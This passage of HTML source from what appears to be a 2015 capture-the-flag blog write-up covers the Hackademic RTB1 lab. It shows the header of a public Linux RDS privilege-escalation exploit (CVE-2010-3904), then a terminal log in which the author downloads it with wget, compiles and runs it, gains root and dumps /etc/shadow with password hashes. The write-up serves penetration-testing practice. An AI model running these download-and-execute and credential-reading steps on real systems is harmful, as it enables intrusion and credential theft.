+</span><span class='line'><span class="c1">//source: http://www.vsecurity.com/resources/advisory/20101019-1/</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">/*</span>
+</span><span class='line'> <span class="o">*</span> <span class="n">Linux</span> <span class="n">Kernel</span> <span class="o">&lt;=</span> <span class="mf">2.6.36</span><span class="o">-</span><span class="n">rc8</span> <span class="n">RDS</span> <span class="n">privilege</span> <span class="n">escalation</span> <span class="n">exploit</span>
+</span><span class='line'> <span class="o">*</span> <span class="n">CVE</span><span class="o">-</span><span class="mi">2010</span><span class="o">-</span><span class="mi">3904</span>
+</span><span class='line'> <span class="o">*</span> <span class="n">by</span> <span class="n">Dan</span> <span class="n">Rosenberg</span> <span class="o">&lt;</span><span class="n">drosenberg</span><span class="err">@</span><span class="n">vsecurity</span><span class="p">.</span><span class="n">com</span><span class="o">&gt;</span>
+</span><span class='line'> <span class="o">*</span>
+</span><span class='line'> <span class="o">*</span> <span class="n">Copyright</span> <span class="mi">2010</span> <span class="n">Virtual</span> <span class="n">Security</span> <span class="n">Research</span><span class="p">,</span> <span class="n">LLC</span>
+</span><span class='line'> <span class="o">*</span>
+</span><span class='line'> <span class="o">*</span> <span class="n">The</span> <span class="n">handling</span> <span class="n">functions</span> <span class="k">for</span> <span class="n">sending</span> <span class="n">and</span> <span class="n">receiving</span> <span class="n">RDS</span> <span class="n">messages</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.0<span class="nv">$ </span>wget --no-check-certificate https://www.exploit-db.com/download/15285 -O a.c
+</span><span class='line'>bash-4.0<span class="nv">$ </span>gcc a.c
+</span><span class='line'>gcc a.c
+</span><span class='line'>bash-4.0<span class="nv">$ </span>./a.out
+</span><span class='line'>./a.out
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Linux kernel &gt;<span class="o">=</span> 2.6.30 RDS socket exploit
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> by Dan Rosenberg
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Resolving kernel addresses...
+</span><span class='line'> <span class="o">[</span>+<span class="o">]</span> Resolved security_ops to 0xc0aa19ac
+</span><span class='line'> <span class="o">[</span>+<span class="o">]</span> Resolved default_security_ops to 0xc0955c6c
+</span><span class='line'> <span class="o">[</span>+<span class="o">]</span> Resolved cap_ptrace_traceme to 0xc055d9d7
+</span><span class='line'> <span class="o">[</span>+<span class="o">]</span> Resolved commit_creds to 0xc044e5f1
+</span><span class='line'> <span class="o">[</span>+<span class="o">]</span> Resolved prepare_kernel_cred to 0xc044e452
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Overwriting security ops...
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Overwriting <span class="k">function</span> pointer...
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Triggering payload...
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Restoring <span class="k">function</span> pointer...
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Got root!
+</span><span class='line'>sh-4.0# id
+</span><span class='line'>id
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span><span class='line'>
+</span><span class='line'>sh-4.0# cat /etc/shadow
+</span><span class='line'>cat /etc/shadow
+</span><span class='line'>root:<span class="nv">$6$4l1OVmLPSV28eVCT$FqycC5mozZ8mqiqgfudLsHUk7R1EMU</span>/FXw3pOcOb39LXekt9VY6HyGkXcLEO.ab9F9t7BqTdxSJvCcy.iYlcp0:14981:0:99999:7:::
+</span><span class='line'>bin:*:14495:0:99999:7:::
+</span><span class='line'>daemon:*:14495:0:99999:7:::
+</span><span class='line'>adm:*:14495:0:99999:7:::
+</span><span class='line'>lp:*:14495:0:99999:7:::
+</span><span class='line'>sync:*:14495:0:99999:7:::
+</span><span class='line'>shutdown:*:14495:0:99999:7:::
+</span><span class='line'>halt:*:14495:0:99999:7:::
+</span><span class='line'>mail:*:14495:0:99999:7:::
+</span><span class='line'>uucp:*:14495:0:99999:7:::
+</span><span class='line'>operator:*:14495:0:99999:7:::
+</span><span class='line'>games:*:14495:0:99999:7:::
+</span><span class='line'>gopher:*:14495:0:99999:7:::
+</span><span class='line'>ftp:*:14495:0:99999:7:::
+</span><span class='line'>nobody:*:14495:0:99999:7:::
+</span><span class='line'>vcsa:!!:14557::::::
+</span><span class='line'>avahi-autoipd:!!:14557::::::
+</span><span class='line'>ntp:!!:14557::::::
+</span><span class='line'>dbus:!!:14557::::::
+</span><span class='line'>rtkit:!!:14557::::::
+</span><span class='line'>nscd:!!:14557::::::
+</span><span class='line'>tcpdump:!!:14557::::::
+</span><span class='line'>avahi:!!:14557::::::
+</span><span class='line'>haldaemon:!!:14557::::::
+</span><span class='line'>openvpn:!!:14557::::::
+</span><span class='line'>apache:!!:14557::::::
+</span><span class='line'>saslauth:!!:14557::::::
+</span><span class='line'>mailnull:!!:14557::::::
+</span><span class='line'>smmsp:!!:14557::::::
+</span><span class='line'>smolt:!!:14557::::::
+</span><span class='line'>sshd:!!:14557::::::
+</span><span class='line'>pulse:!!:14557::::::
+</span><span class='line'>gdm:!!:14557::::::
+</span><span class='line'>p0wnbox.Team:<span class="nv">$6$rPArLuwe8rM9Avwv$a5coOdUCQQY7NgvTnXaFj2D5SmggRrFsr6TP8g7IATVeEt37LUGJYvHM1myhelCyPkIjd8Yv5olMnUhwbQL76</span>/:14981:0:99999:7:::
+</span><span class='line'>mysql:!!:14981::::::
+</span></code></pre></td></tr></table></div></figure>
+
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Norbert Szetei</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2015-05-29T14:32:12+02:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>29</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>2:32 pm</span></time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/hackademic/'>hackademic</a>, <a class='category' href='/blog/categories/vulnhub/'>vulnhub</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://73696e65.github.io/blog/2015/05/29/hackademic-rtb1/" data-via="" data-counturl="http://73696e65.github.io/blog/2015/05/29/hackademic-rtb1/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2015/05/22/pwnos-2-dot-0/" title="Previous Post: pWnOS: 2.0">&laquo; pWnOS: 2.0</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2015/05/29/hackademic-rtb1/">Hackademic: RTB1</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/05/22/pwnos-2-dot-0/">pWnOS: 2.0</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/05/17/kioptrix-level-3/">Kioptrix: Level 3</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/05/16/rattus-loophole/">Rattus: Loophole</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/05/14/de-ice-s1-dot-130/">DE-ICE-S1.130</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2015 - Norbert Szetei -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
